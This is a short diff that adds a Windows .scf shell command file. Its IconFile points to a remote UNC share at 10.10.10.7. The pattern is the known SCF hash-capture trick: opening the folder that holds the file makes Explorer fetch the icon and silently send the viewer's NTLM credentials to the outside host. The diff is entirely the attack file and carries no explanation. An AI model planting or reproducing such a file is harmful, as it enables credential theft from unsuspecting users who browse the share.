@@ -1,0 +1,5 @@
+[Shell]
+Command=2
+IconFile=\\10.10.10.7\share\icon.ico
+[Taskbar]
+Command=ToggleDesktop
